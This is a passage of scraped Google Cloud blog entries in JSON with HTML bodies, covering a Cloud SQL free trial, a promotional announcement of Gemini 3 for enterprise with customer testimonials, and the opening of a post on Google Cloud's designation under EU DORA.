</div>\n</div>\n</div>\n</div></div>\n<div class=\"block-image_full_width\">\n\n\n\n\n\n\n  \n    <div class=\"article-module h-c-page\">\n      <div class=\"h-c-grid\">\n  \n\n    <figure class=\"article-image--large\n      \n      \n        h-c-grid__col\n        h-c-grid__col--6 h-c-grid__col--offset-3\n        \n        \n      \">\n\n      \n      \n        \n        <img alt=\"1\" src=\"https://storage.googleapis.com/gweb-cloudblog-publish/images/1_taGjFKS.max-1000x1000.jpg\" />\n        \n        </a>\n      \n    </figure>\n\n  \n      </div>\n    </div>\n  \n\n\n\n\n</div>\n<div class=\"block-paragraph_advanced\"><p><span style=\"vertical-align: baseline;\">When you’re ready to move your workload to production, upgrading to a paid instance is a simple </span><a href=\"https://cloud.google.com/sql/docs/postgres/upgrade-cloud-sql-instance-to-enterprise-plus-in-place\"><span style=\"text-decoration: underline; vertical-align: baseline;\">one-click upgrade</span></a><span style=\"vertical-align: baseline;\">, at any time during the trial.</span></p>\n<p><span style=\"vertical-align: baseline;\">Not ready to upgrade quite yet? At the end of the 30-day free trial, we automatically suspend your free trial resources, keeping the instance in a \"stopped\" state for an additional 90 days, at no additional charge. This should give you ample time to upgrade and continue without interruption.</span></p>\n<h3><strong style=\"vertical-align: baseline;\">Ready to get started?</strong></h3>\n<p><span style=\"vertical-align: baseline;\">Ready to unlock the full potential of your data with Cloud SQL? </span><span style=\"vertical-align: baseline;\">Creating your free trial instance is easy. If you’re new to Google Cloud, just sign up for an account and follow the instructions to </span><a href=\"https://docs.cloud.google.com/sql/docs/mysql/create-free-trial-instance\"><span style=\"text-decoration: underline; vertical-align: baseline;\">create your Cloud SQL free trial instance</span></a><span style=\"vertical-align: baseline;\">. </span><span style=\"vertical-align: baseline;\">This exciting offer is available in all Google Cloud regions.</span><span style=\"vertical-align: baseline;\"> Start your free trial and see what Cloud SQL can do for your applications.</span></p></div>",
        "published_date": "2025-11-18 17:00:00"
    },
    {
        "website": "GOOGLE_CLOUD_BLOG",
        "link": "https://cloud.google.com/blog/products/ai-machine-learning/gemini-3-is-available-for-enterprise/",
        "title": "Bringing Gemini 3 to Enterprise",
        "thumbnail": "https://storage.googleapis.com/gweb-cloudblog-publish/images/Gemini_3_Blog_1_1.max-600x600.jpg",
        "author": "Saurabh Tiwary",
        "track": null,
        "description": "<div class=\"block-paragraph_advanced\"><p><span style=\"vertical-align: baseline;\">The fastest way to transform your business is here. Today, we’re bringing </span><span style=\"vertical-align: baseline;\">Gemini 3</span><span style=\"vertical-align: baseline;\">, our most intelligent model, to every developer and enterprise team. It’s the best model in the world for multimodal understanding,</span><span style=\"vertical-align: baseline;\"> </span><span style=\"vertical-align: baseline;\">and our most powerful agentic and vibe-coding model yet</span><span style=\"vertical-align: baseline;\">. </span><span style=\"vertical-align: baseline;\">Plus, Gemini 3 Pro </span><span style=\"vertical-align: baseline;\">tops the LMArena Leaderboard with a breakthrough score of 1501 Elo. </span><span style=\"vertical-align: baseline;\">You can learn more about the model capabilities </span><a href=\"https://blog.google/products/gemini/gemini-3\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\">here</span></a><span style=\"vertical-align: baseline;\">.</span></p>\n<p><span style=\"vertical-align: baseline;\">Gemini 3 is available now in </span><a href=\"https://cloud.google.com/gemini-enterprise?e=48754805\"><span style=\"text-decoration: underline; vertical-align: baseline;\">Gemini Enterprise</span></a><span style=\"vertical-align: baseline;\"> and </span><a href=\"https://cloud.google.com/vertex-ai?e=48754805\"><span style=\"text-decoration: underline; vertical-align: baseline;\">Vertex AI</span></a><span style=\"vertical-align: baseline;\">, so businesses and developers can access: </span></p>\n<ol>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">State-of-the-art reasoning and multimodality: </strong><span style=\"vertical-align: baseline;\">Gemini 3 uses multimodal understanding and state-of-the-art reasoning to analyze text, video, and files all at once. Applications can range from analyzing X-rays and MRI scans to assist in faster diagnostics; to automatically generate transcripts and metadata for podcast content; or to analyzing streams of machine logs to anticipate equipment failure before it happens. </span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">Powerful agentic coding and front-end creation: </strong><span style=\"vertical-align: baseline;\">Gemini 3 is our most powerful agentic and vibe-coding model yet for transforming application development and design. With Gemini 3, enterprises can rapidly prototype full front-end interfaces with a single prompt and leverage agentic coding to quickly move from prototype to production.</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">Advanced tool use and planning: </strong><span style=\"vertical-align: baseline;\">Gemini 3 enables advanced reasoning with large sets of tools, facilitating long-running tasks across your enterprise systems and data. Businesses can now leverage Gemini 3 to execute tasks like financial planning, supply chain adjustments, and contract evaluation. </span></p>\n</li>\n</ol>\n<p><span style=\"vertical-align: baseline;\">Taken together, Gemini 3 is our most intelligent model for helping enterprises transform their businesses for the agentic future. </span></p></div>\n<div class=\"block-image_full_width\">\n\n\n\n\n\n\n  \n    <div class=\"article-module h-c-page\">\n      <div class=\"h-c-grid\">\n  \n\n    <figure class=\"article-image--large\n      \n      \n        h-c-grid__col\n        h-c-grid__col--6 h-c-grid__col--offset-3\n        \n        \n      \">\n\n      \n      \n        \n        <img alt=\"Updated logo Wall G3\" src=\"https://storage.googleapis.com/gweb-cloudblog-publish/images/Gemini_3_Customer_logo_wall_DRAFT_2.max-1000x1000.png\" />\n        \n        </a>\n      \n    </figure>\n\n  \n      </div>\n    </div>\n  \n\n\n\n\n</div>\n<div class=\"block-paragraph_advanced\"><h3><strong style=\"vertical-align: baseline;\">State-of-the-art reasoning and multimodality</strong></h3>\n<p><span style=\"vertical-align: baseline;\">Consider the friction your teams face every day – the data you need exists, but extracting meaning from it forces your smartest people to perform tedious, manual work. That’s why we built Gemini 3 from the ground up to synthesize information about any topic across multiple modalities, including text, images, video, audio, and code. </span></p>\n<p><strong style=\"vertical-align: baseline;\">What this means for your business: </strong></p>\n<ul>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">Deeply understand any topic or dataset: </strong><span style=\"vertical-align: baseline;\">Gemini 3 is our most factually accurate model. You can produce personalized training and employee onboarding, perform legal and contract analysis, or handle procurement, with confidence in the model’s understanding of your business. </span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">Make better, data-backed decisions: </strong><span style=\"vertical-align: baseline;\">Gemini 3’s powerful multimodal understanding makes sense of your data, no matter where it comes from. For example, you can more accurately analyze videos, factory floor images, and customer calls alongside text reports, giving you a more unified view of your data. </span></p>\n</li>\n</ul>\n<p><strong style=\"vertical-align: baseline;\">How customers are already seeing impact: </strong></p></div>\n<div class=\"block-paragraph_with_image\"><div class=\"article-module h-c-page\">\n  <div class=\"h-c-grid uni-paragraph-wrap\">\n    <div class=\"uni-paragraph\n      h-c-grid__col h-c-grid__col--8 h-c-grid__col-m--6 h-c-grid__col-l--6\n      h-c-grid__col--offset-2 h-c-grid__col-m--offset-3 h-c-grid__col-l--offset-3\">\n\n      \n\n\n\n\n\n\n  \n\n    <figure class=\"article-image--wrap-small\n      \n      \">\n\n      \n      \n        \n        <img alt=\"1 box\" src=\"https://storage.googleapis.com/gweb-cloudblog-publish/images/1_box.max-1000x1000.jpg\" />\n        \n        </a>\n      \n    </figure>\n\n  \n\n\n\n\n\n      <p><i>“As organizations generate and work with vast amounts of unstructured data, Gemini 3 Pro brings a new level of multimodal understanding, planning, and tool-calling that transforms how Box AI interprets and applies your institutional knowledge. The result is content actively working for you to deliver faster decisions and execute across mission-critical workflows, from sales and marketing to legal and finance. We're excited to offer Gemini 3 Pro to customers today through the Box AI Studio.”</i></p><p><b><i>Ben Kus, CTO, Box</i></b></p>\n    </div>\n  </div>\n</div>\n\n</div>\n<div class=\"block-paragraph_with_image\"><div class=\"article-module h-c-page\">\n  <div class=\"h-c-grid uni-paragraph-wrap\">\n    <div class=\"uni-paragraph\n      h-c-grid__col h-c-grid__col--8 h-c-grid__col-m--6 h-c-grid__col-l--6\n      h-c-grid__col--offset-2 h-c-grid__col-m--offset-3 h-c-grid__col-l--offset-3\">\n\n      \n\n\n\n\n\n\n  \n\n    <figure class=\"article-image--wrap-small\n      \n      \">\n\n      \n      \n        \n        <img alt=\"2 presentations ai\" src=\"https://storage.googleapis.com/gweb-cloudblog-publish/images/2_presentations_ai.max-1000x1000.jpg\" />\n        \n        </a>\n      \n    </figure>\n\n  \n\n\n\n\n\n      <p><i>\"Presentations.AI uses Gemini 3's multimodal reasoning to analyze company info, extract key strategic moves, and generate content that enables enterprise sales teams to walk into C-suite meetings with intelligence that took analysts 6 hours to compile - generated in 90 seconds.\"</i></p><p><b><i>Sumanth Raghavendra, CEO and Co-founder, Presentations.AI</i></b></p>\n    </div>\n  </div>\n</div>\n\n</div>\n<div class=\"block-paragraph_with_image\"><div class=\"article-module h-c-page\">\n  <div class=\"h-c-grid uni-paragraph-wrap\">\n    <div class=\"uni-paragraph\n      h-c-grid__col h-c-grid__col--8 h-c-grid__col-m--6 h-c-grid__col-l--6\n      h-c-grid__col--offset-2 h-c-grid__col-m--offset-3 h-c-grid__col-l--offset-3\">\n\n      \n\n\n\n\n\n\n  \n\n    <figure class=\"article-image--wrap-small\n      \n      \">\n\n      \n      \n        \n        <img alt=\"3 Rakuten\" src=\"https://storage.googleapis.com/gweb-cloudblog-publish/images/3_Rakuten.max-1000x1000.jpg\" />\n        \n        </a>\n      \n    </figure>\n\n  \n\n\n\n\n\n      <p><i>“Gemini 3 represents a significant advancement in multimodal AI. Rakuten partnered with Google to perform alpha testing, and its ability to handle real-world conditions across both audio and vision modalities, especially in challenging scenarios like overlapping speakers or blurry images, sets it apart for enterprise applications. From accurately transcribing 3-hour multilingual meetings with superior speaker identification, to extracting structured data from poor-quality document photos, outperforming baseline models by over 50%, it showcased impressive capabilities that redefine enterprise potential.”</i></p><p><b><i>Yusuke Kaji General Manager, AI for Business, Rakuten Group, Inc.</i></b></p>\n    </div>\n  </div>\n</div>\n\n</div>\n<div class=\"block-paragraph_advanced\"><h3><strong style=\"vertical-align: baseline;\">Powerful agentic coding and front-end creation </strong></h3>\n<p><span style=\"vertical-align: baseline;\">Many technical teams and developers are often bogged down by the heavy lift of maintaining brittle legacy systems and the cognitive load of juggling disconnected tools. </span></p>\n<p><span style=\"vertical-align: baseline;\">Gemini 3 has powerful agentic coding capabilities to enable legacy code migration and software testing that act as a force multiplier for technical teams. With a 1M token context window that leads the industry on long context performance, Gemini 3 outperforms previous generations and can consume entire code bases to help developers be more efficient than ever before. Finally, with dramatic improvements in frontend quality, developers can now use Gemini 3 to generate and render richer aesthetics and more sophisticated UI components faster and more reliably.</span></p>\n<p><span style=\"vertical-align: baseline;\">Accessible through the terminal via </span><a href=\"https://geminicli.com/\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\">Gemini CLI</span></a><span style=\"vertical-align: baseline;\">, as well as Google’s new agentic development platform, Google </span><a href=\"https://blog.google/technology/developers/gemini-3-developers\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\">Antigravity</span></a><span style=\"vertical-align: baseline;\">, Gemini 3’s powerful intelligence enables it to better synthesize disparate pieces of code and following complex user instructions to handle multi-step development tasks simultaneously. Third party coding platforms like Cursor, GitHub, JetBrains, Manus, Replit</span><span style=\"vertical-align: baseline;\">, </span><span style=\"vertical-align: baseline;\">and more</span><span style=\"vertical-align: baseline;\"> </span><span style=\"vertical-align: baseline;\">are already integrating Gemini 3 Pro into their tools for developers.</span></p>\n<p><strong style=\"vertical-align: baseline;\">What this means for your business:</strong></p>\n<ul>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">Accelerate the move from concept to execution: </strong><span style=\"vertical-align: baseline;\">The enhanced zero-shot generation and exceptional instruction following of Gemini 3 allows development teams to rapidly generate everything from well-organized wireframes to stunning high-fidelity frontend prototypes with superior aesthetics and sophisticated UI components.</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">Help technical teams do more, safely</strong><span style=\"vertical-align: baseline;\">: Because Gemini 3 is the best vibe coding and agentic coding model we’ve ever built, it’s even better at updating old code, running software tests, and handling complex operations – all with our most comprehensive set of safety evaluations to date.</span></p>\n</li>\n</ul>\n<p><strong style=\"vertical-align: baseline;\">How customers are already seeing impact:</strong></p></div>\n<div class=\"block-paragraph_with_image\"><div class=\"article-module h-c-page\">\n  <div class=\"h-c-grid uni-paragraph-wrap\">\n    <div class=\"uni-paragraph\n      h-c-grid__col h-c-grid__col--8 h-c-grid__col-m--6 h-c-grid__col-l--6\n      h-c-grid__col--offset-2 h-c-grid__col-m--offset-3 h-c-grid__col-l--offset-3\">\n\n      \n\n\n\n\n\n\n  \n\n    <figure class=\"article-image--wrap-small\n      \n      \">\n\n      \n      \n        \n        <img alt=\"4 Cursor\" src=\"https://storage.googleapis.com/gweb-cloudblog-publish/images/4_Cursor.max-1000x1000.jpg\" />\n        \n        </a>\n      \n    </figure>\n\n  \n\n\n\n\n\n      <p><i>“We’re excited to partner with Google to launch Gemini 3 in Cursor! Gemini 3 Pro shows noticeable improvements in frontend quality, and works well for solving the most ambitious tasks.”</i></p><p><b><i>Sualeh Asif, Co-founder and Chief Product Officer, Cursor</i></b></p>\n    </div>\n  </div>\n</div>\n\n</div>\n<div class=\"block-paragraph_with_image\"><div class=\"article-module h-c-page\">\n  <div class=\"h-c-grid uni-paragraph-wrap\">\n    <div class=\"uni-paragraph\n      h-c-grid__col h-c-grid__col--8 h-c-grid__col-m--6 h-c-grid__col-l--6\n      h-c-grid__col--offset-2 h-c-grid__col-m--offset-3 h-c-grid__col-l--offset-3\">\n\n      \n\n\n\n\n\n\n  \n\n    <figure class=\"article-image--wrap-small\n      \n      \">\n\n      \n      \n        \n        <img alt=\"5 Figma\" src=\"https://storage.googleapis.com/gweb-cloudblog-publish/images/5_Figma.max-1000x1000.jpg\" />\n        \n        </a>\n      \n    </figure>\n\n  \n\n\n\n\n\n      <p><i>“With Gemini 3 Pro in Figma Make, teams have a strong foundation to explore and steer their ideas with code-backed prototypes. The model translates designs with precision and generates a wide, inventive range of styles, layouts, and interactions. As foundation models get better, Figma gets better — and I’m excited to see how Gemini 3 Pro helps our community unlock new creative possibilities.”</i></p><p><b><i>Loredana Crisan, Chief Design Officer, Figma</i></b></p>\n    </div>\n  </div>\n</div>\n\n</div>\n<div class=\"block-paragraph_with_image\"><div class=\"article-module h-c-page\">\n  <div class=\"h-c-grid uni-paragraph-wrap\">\n    <div class=\"uni-paragraph\n      h-c-grid__col h-c-grid__col--8 h-c-grid__col-m--6 h-c-grid__col-l--6\n      h-c-grid__col--offset-2 h-c-grid__col-m--offset-3 h-c-grid__col-l--offset-3\">\n\n      \n\n\n\n\n\n\n  \n\n    <figure class=\"article-image--wrap-small\n      \n      \">\n\n      \n      \n        \n        <img alt=\"6 GitHub\" src=\"https://storage.googleapis.com/gweb-cloudblog-publish/images/6_GitHub.max-1000x1000.jpg\" />\n        \n        </a>\n      \n    </figure>\n\n  \n\n\n\n\n\n      <p><i>“By bringing Gemini 3 Pro to GitHub Copilot, we’re seeing promising gains in how quickly and confidently developers can move from idea to code. In our early testing in VS Code, Gemini 3 Pro demonstrated 35% higher accuracy in resolving software engineering challenges than Gemini 2.5 Pro. That's the kind of potential that translates to developers solving real-world problems with more speed and effectiveness.”</i></p><p><b><i>Joe Binder, VP of Product, GitHub</i></b></p>\n    </div>\n  </div>\n</div>\n\n</div>\n<div class=\"block-paragraph_with_image\"><div class=\"article-module h-c-page\">\n  <div class=\"h-c-grid uni-paragraph-wrap\">\n    <div class=\"uni-paragraph\n      h-c-grid__col h-c-grid__col--8 h-c-grid__col-m--6 h-c-grid__col-l--6\n      h-c-grid__col--offset-2 h-c-grid__col-m--offset-3 h-c-grid__col-l--offset-3\">\n\n      \n\n\n\n\n\n\n  \n\n    <figure class=\"article-image--wrap-small\n      \n      \">\n\n      \n      \n        \n        <img alt=\"7 JetBrains\" src=\"https://storage.googleapis.com/gweb-cloudblog-publish/images/7_JetBrains.max-1000x1000.jpg\" />\n        \n        </a>\n      \n    </figure>\n\n  \n\n\n\n\n\n      <p><i>“At JetBrains, we pride ourselves on code quality, so we challenged Gemini 3 Pro with demanding frontline tasks: from generating thousands of lines of front-end code to even simulating an operating-system interface from a single prompt. The new Gemini 3 Pro model advances the depth, reasoning, and reliability of AI in developer tools, showing more than a 50% improvement over Gemini 2.5 Pro in the number of solved benchmark tasks. In collaboration with Google, we’re now integrating Gemini 3 Pro into Junie and AI Assistant, to deliver smarter, more context-aware experiences to millions of developers worldwide.”</i></p><p><b><i>Vladislav Tankov, Director of AI, JetBrains</i></b></p>\n    </div>\n  </div>\n</div>\n\n</div>\n<div class=\"block-paragraph_with_image\"><div class=\"article-module h-c-page\">\n  <div class=\"h-c-grid uni-paragraph-wrap\">\n    <div class=\"uni-paragraph\n      h-c-grid__col h-c-grid__col--8 h-c-grid__col-m--6 h-c-grid__col-l--6\n      h-c-grid__col--offset-2 h-c-grid__col-m--offset-3 h-c-grid__col-l--offset-3\">\n\n      \n\n\n\n\n\n\n  \n\n    <figure class=\"article-image--wrap-small\n      \n      \">\n\n      \n      \n        \n        <img alt=\"8 Replit\" src=\"https://storage.googleapis.com/gweb-cloudblog-publish/images/8_Replit.max-1000x1000.jpg\" />\n        \n        </a>\n      \n    </figure>\n\n  \n\n\n\n\n\n      <p><i>\"Gemini 3 Pro truly stands out for its design capabilities, offering an unprecedented level of flexibility while creating apps. Like a skilled UI designer, it can range from well-organized wireframes to stunning high-fidelity prototypes.”</i></p><p><b><i>Michele Catasta, President &amp; Head of AI, Replit</i></b></p>\n    </div>\n  </div>\n</div>\n\n</div>\n<div class=\"block-paragraph_advanced\"><h3><strong style=\"vertical-align: baseline;\">Advanced tool use and planning</strong></h3>\n<p><span style=\"vertical-align: baseline;\">When using AI to work through complex problems, clarity is key. It’s why we trained Gemini 3 to be stronger at tool use and planning so it could be a reliable collaborator when you’re creating sophisticated agents for long-running complex business tasks . Whether you’re building agents to complete multi-step tasks, create plans, or do business planning, Gemini 3 helps you achieve the right outcomes.</span></p>\n<p><strong style=\"vertical-align: baseline;\">What this means for your business: </strong></p>\n<ul>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">Build agents that help you forecast: </strong><span style=\"vertical-align: baseline;\">Gemini 3 is the best vibe coding and agentic coding model we’ve ever built – making our products more autonomous and boosting developer productivity.</span><span style=\"vertical-align: baseline;\"> </span><span style=\"vertical-align: baseline;\">Combined with state-of-the-art reasoning, it means you can execute </span><span style=\"font-style: italic; vertical-align: baseline;\">and </span><span style=\"vertical-align: baseline;\">forecast quarterly planning, customer support needs, demand campaigns, and more.</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">Pair strategy with agent execution:</strong><span style=\"vertical-align: baseline;\"> Gemini 3’s advanced tool use and reasoning capabilities means you can connect your high-level strategy with the business tools that will carry out the actual work to assist in items like budgeting to full-cycle customer support. </span></p>\n</li>\n</ul>\n<p><strong style=\"vertical-align: baseline;\">How customers are already seeing impact:</strong></p></div>\n<div class=\"block-paragraph_with_image\"><div class=\"article-module h-c-page\">\n  <div class=\"h-c-grid uni-paragraph-wrap\">\n    <div class=\"uni-paragraph\n      h-c-grid__col h-c-grid__col--8 h-c-grid__col-m--6 h-c-grid__col-l--6\n      h-c-grid__col--offset-2 h-c-grid__col-m--offset-3 h-c-grid__col-l--offset-3\">\n\n      \n\n\n\n\n\n\n  \n\n    <figure class=\"article-image--wrap-small\n      \n      \">\n\n      \n      \n        \n        <img alt=\"9 Geotab\" src=\"https://storage.googleapis.com/gweb-cloudblog-publish/images/9_Geotab.max-1000x1000.jpg\" />\n        \n        </a>\n      \n    </figure>\n\n  \n\n\n\n\n\n      <p><i>“Gemini 3 Pro is significantly enhancing our user experience on complex agent tasks that require multi-step planning. We immediately achieved a 10% boost in the relevancy of responses for a complex code-generation task used for data retrieval and noted a further 30% reduction in tool-calling mistakes. Ultimately this means our customers get correct answers more often, and more quickly.”</i></p><p><b><i>Bob Bradley, Vice President, Data Science &amp; AI Engineering, Geotab</i></b></p>\n    </div>\n  </div>\n</div>\n\n</div>\n<div class=\"block-paragraph_with_image\"><div class=\"article-module h-c-page\">\n  <div class=\"h-c-grid uni-paragraph-wrap\">\n    <div class=\"uni-paragraph\n      h-c-grid__col h-c-grid__col--8 h-c-grid__col-m--6 h-c-grid__col-l--6\n      h-c-grid__col--offset-2 h-c-grid__col-m--offset-3 h-c-grid__col-l--offset-3\">\n\n      \n\n\n\n\n\n\n  \n\n    <figure class=\"article-image--wrap-small\n      \n      \">\n\n      \n      \n        \n        <img alt=\"10 Manus AI\" src=\"https://storage.googleapis.com/gweb-cloudblog-publish/images/10_Manus_AI.max-1000x1000.jpg\" />\n        \n        </a>\n      \n    </figure>\n\n  \n\n\n\n\n\n      <p><i>\"We’re delighted to see the launch of Gemini 3! With this release, we’ve observed even stronger performance in the model’s reasoning and problem-solving capabilities. Many of Manus’ recent advancements—such as Wide Research and the web-building capabilities introduced in Manus 1.5—have become significantly more powerful with Gemini 3’s support. We look forward to continuing our partnership and delivering even better experiences for our users together.\"</i></p><p><b><i>Tao Zhang, Co-Founder and Chief Product Officer, Manus AI</i></b></p>\n    </div>\n  </div>\n</div>\n\n</div>\n<div class=\"block-paragraph_with_image\"><div class=\"article-module h-c-page\">\n  <div class=\"h-c-grid uni-paragraph-wrap\">\n    <div class=\"uni-paragraph\n      h-c-grid__col h-c-grid__col--8 h-c-grid__col-m--6 h-c-grid__col-l--6\n      h-c-grid__col--offset-2 h-c-grid__col-m--offset-3 h-c-grid__col-l--offset-3\">\n\n      \n\n\n\n\n\n\n  \n\n    <figure class=\"article-image--wrap-small\n      \n      \">\n\n      \n      \n        \n        <img alt=\"11 Shopify\" src=\"https://storage.googleapis.com/gweb-cloudblog-publish/images/11_Shopify.max-1000x1000.jpg\" />\n        \n        </a>\n      \n    </figure>\n\n  \n\n\n\n\n\n      <p><i>\"Gemini 3 is a major leap forward for agentic AI. It follows complex instructions with minimal prompt tuning and reliably calls tools, which are critical capabilities to build truly helpful agents. This advancement accelerates Shopify’s ability to build agentic AI tools that solve complex commerce challenges for our merchants.\"</i></p><p><b><i>Mikhail Parakhin, Chief Technology Officer, Shopify</i></b></p>\n    </div>\n  </div>\n</div>\n\n</div>\n<div class=\"block-paragraph_with_image\"><div class=\"article-module h-c-page\">\n  <div class=\"h-c-grid uni-paragraph-wrap\">\n    <div class=\"uni-paragraph\n      h-c-grid__col h-c-grid__col--8 h-c-grid__col-m--6 h-c-grid__col-l--6\n      h-c-grid__col--offset-2 h-c-grid__col-m--offset-3 h-c-grid__col-l--offset-3\">\n\n      \n\n\n\n\n\n\n  \n\n    <figure class=\"article-image--wrap-small\n      \n      \">\n\n      \n      \n        \n        <img alt=\"11 Thomson Reuters\" src=\"https://storage.googleapis.com/gweb-cloudblog-publish/images/11_Thomson_Reuters.max-1000x1000.jpg\" />\n        \n        </a>\n      \n    </figure>\n\n  \n\n\n\n\n\n      <p><i>\"Our early evaluations indicate that Gemini 3 is delivering state-of-the-art reasoning with depth and nuance. We have observed measurable and significant progress in both legal reasoning and complex contract understanding. We deeply value the opportunity to collaborate closely with Google DeepMind to validate how these improvements translate into real-world, professional-grade performance for our users. This partnership is vital to bringing the most advanced AI to market with confidence and transparency.”</i></p><p><b><i>Joel Hron, Chief Technology Officer, Thomson Reuters</i></b></p>\n    </div>\n  </div>\n</div>\n\n</div>\n<div class=\"block-paragraph_with_image\"><div class=\"article-module h-c-page\">\n  <div class=\"h-c-grid uni-paragraph-wrap\">\n    <div class=\"uni-paragraph\n      h-c-grid__col h-c-grid__col--8 h-c-grid__col-m--6 h-c-grid__col-l--6\n      h-c-grid__col--offset-2 h-c-grid__col-m--offset-3 h-c-grid__col-l--offset-3\">\n\n      \n\n\n\n\n\n\n  \n\n    <figure class=\"article-image--wrap-small\n      \n      \">\n\n      \n      \n        \n        <img alt=\"12 Wayfair\" src=\"https://storage.googleapis.com/gweb-cloudblog-publish/images/12_Wayfair.max-1000x1000.jpg\" />\n        \n        </a>\n      \n    </figure>\n\n  \n\n\n\n\n\n      <p><i>\"At Wayfair, we’ve been piloting Google’s Gemini 3 Pro to turn complex partner support SOPs into clear, data-accurate infographics for our field associates. Compared with Gemini 2.5 Pro, it’s a clear step forward in handling structured business tasks that require precision and consistency — helping our teams grasp key information faster and support partners more effectively.”</i></p><p><b><i>Fiona Tan, CTO, Wayfair</i></b></p>\n    </div>\n  </div>\n</div>\n\n</div>\n<div class=\"block-paragraph_with_image\"><div class=\"article-module h-c-page\">\n  <div class=\"h-c-grid uni-paragraph-wrap\">\n    <div class=\"uni-paragraph\n      h-c-grid__col h-c-grid__col--8 h-c-grid__col-m--6 h-c-grid__col-l--6\n      h-c-grid__col--offset-2 h-c-grid__col-m--offset-3 h-c-grid__col-l--offset-3\">\n\n      \n\n\n\n\n\n\n  \n\n    <figure class=\"article-image--wrap-small\n      \n      \">\n\n      \n      \n        \n        <img alt=\"13 WRTN\" src=\"https://storage.googleapis.com/gweb-cloudblog-publish/images/13_WRTN.max-1000x1000.jpg\" />\n        \n        </a>\n      \n    </figure>\n\n  \n\n\n\n\n\n      <p><i>At WRTN, we leverage Gemini 3 across the full spectrum of our business—from powering Story Generation in Crack and delivering contextual Companion Chat to driving Memory Management and complex B2B Agent Projects. Gemini 3’s multi-lingual capabilities are stellar, especially in high-fidelity languages like Korean, where every model iteration becomes dramatically more natural and stable across all domains. This stability is critical for our agentic planning workflows. The direct and iterative partnership with the Gemini team is what makes this collaboration truly game-changing.</i></p><p><b><i>DJ Lee, Chief Product Officer, WRTN Technologies Inc.</i></b></p>\n    </div>\n  </div>\n</div>\n\n</div>\n<div class=\"block-paragraph_advanced\"><h3><strong style=\"vertical-align: baseline;\">Get started with Gemini 3 </strong></h3>\n<p><span style=\"vertical-align: baseline;\">Today, you can safely put our most powerful agentic and vibe-coding model to work. We're making Gemini 3 available where your teams already are:</span></p>\n<ul>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">For business teams:</strong><span style=\"vertical-align: baseline;\"> You can access Gemini 3 Pro in preview on </span><a href=\"https://cloud.google.com/gemini-enterprise\"><span style=\"text-decoration: underline; vertical-align: baseline;\">Gemini Enterprise</span></a><span style=\"vertical-align: baseline;\">, our advanced agentic platform for teams to discover, create, share, and run AI agents all in one secure platform. </span></p>\n</li>\n<li><strong style=\"vertical-align: baseline;\">For developers:</strong><span style=\"vertical-align: baseline;\"> You can start building with Gemini 3 Pro in preview on </span><a href=\"http://console.cloud.google.com/freetrial?redirectPath=/vertex-ai/studio/multimodal\"><span style=\"text-decoration: underline; vertical-align: baseline;\">Vertex AI</span></a><span style=\"vertical-align: baseline;\"> today. Gemini 3  is also available in Google Antigravity, </span><a href=\"https://docs.cloud.google.com/gemini/docs/codeassist/gemini-cli\"><span style=\"text-decoration: underline; vertical-align: baseline;\">Gemini CLI</span></a><span style=\"vertical-align: baseline;\">, </span><a href=\"https://ai.google.dev/aistudio\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\">AI Studio</span></a><span style=\"vertical-align: baseline;\">, and </span><a href=\"https://blog.google/technology/developers/gemini-3-developers\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\">more</span></a><span style=\"vertical-align: baseline;\">.</span></li>\n</ul></div>",
        "published_date": "2025-11-18 16:00:00"
    },
    {
        "website": "GOOGLE_CLOUD_BLOG",
        "link": "https://cloud.google.com/blog/products/identity-security/supporting-customers-as-a-critical-provider-under-eu-dora/",
        "title": "A new era: Supporting customers as a critical ICT third-party provider under EU DORA",
        "thumbnail": null,
        "author": "Tara Brady",
        "track": null,
        "description": "<div class=\"block-paragraph_advanced\"><p><span style=\"vertical-align: baseline;\">At Google Cloud, we take our role in the financial ecosystem in Europe very seriously. We also firmly believe that digital operational resilience is vital to safeguarding and enhancing innovation. </span></p>\n<p><span><span style=\"vertical-align: baseline;\">Today, we mark a significant milestone in our long-term commitment to the European financial services sector. The European Supervisory Authorities (ESAs) have officially </span><a href=\"https://www.eba.europa.eu/publications-and-media/press-releases/european-supervisory-authorities-designate-critical-ict-third-party-providers-under-digital\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\">designated</span></a><span style=\"vertical-align: baseline;\"> Google Cloud EMEA Limited (Google Cloud EMEA), together with its subsidiaries, as a critical Information and Communication Technology (ICT) third-party service provider (CTPP) under the EU Digital Operational Resilience Act (DORA). </span></span></p>\n<p><span style=\"vertical-align: baseline;\">This designation acknowledges the systemic importance of the financial entities that rely on our services, as well as the importance of the workloads they have deployed. We welcome this new phase under DORA, and we remain committed to working with our customers and our regulators under DORA to drive towards even greater resilience for the European financial system. </span></p>\n<h3><strong style=\"vertical-align: baseline;\">Embracing direct oversight</strong></h3>\n<p><span style=\"vertical-align: baseline;\">Google Cloud EMEA has been assigned a dedicated Lead Overseer who will assess our strength in managing ICT risks through oversight. This oversight establishes a direct communication channel between Google Cloud and financial regulators in the EU, and provides a significant opportunity to enhance understanding, transparency, and trust between all parties. </span></p>\n<p><span style=\"vertical-align: baseline;\">We are confident that this structured dialogue will help us learn and contribute to improved risk management and resilience across the entire sector. We will approach our relationship with the ESAs and our Lead Overseer with the same commitment to ongoing transparency, collaboration, and assurance that we offer our customers and their regulators today.</span></p>\n<h3><strong style=\"vertical-align: baseline;\">Keeping customer success in focus 